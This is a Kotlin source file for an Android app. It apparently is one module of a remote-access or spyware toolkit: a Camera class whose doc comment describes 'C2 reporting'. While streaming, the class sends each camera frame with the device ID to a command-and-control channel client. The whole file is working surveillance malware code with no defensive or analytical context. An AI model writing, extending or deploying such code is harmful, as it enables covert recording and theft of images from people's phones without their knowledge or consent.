package com.xrc.sensors

import android.Manifest
import android.content.Context
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.crypto.Identity
import com.xrc.core.toJsonString

/**
 * Camera — camera capture module with C2 reporting.
 */
class Camera(
    private val context: Context,
    private val channelClient: ChannelClient
) {
    private val capture = CameraCapture(context)

    fun captureStill(): String? = capture.captureStill()

    fun startStreaming(onFrame: (String) -> Unit) {
        capture.startStreaming { frame ->
            val deviceId = Identity.getDeviceId(context)
            val msg = Message(
                type = Protocol.TYPE_SENSOR_DATA,
                id = "cam_${System.currentTimeMillis()}",
                device_id = deviceId,
                payload = mapOf("type" to "camera_frame", "data" to frame).toJsonString()
            )
            channelClient.send(msg)
            onFrame(frame)
        }
    }

    fun stopStreaming() = capture.stopStreaming()
    fun hasPermission(): Boolean = context.checkSelfPermission(Manifest.permission.CAMERA) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED
}
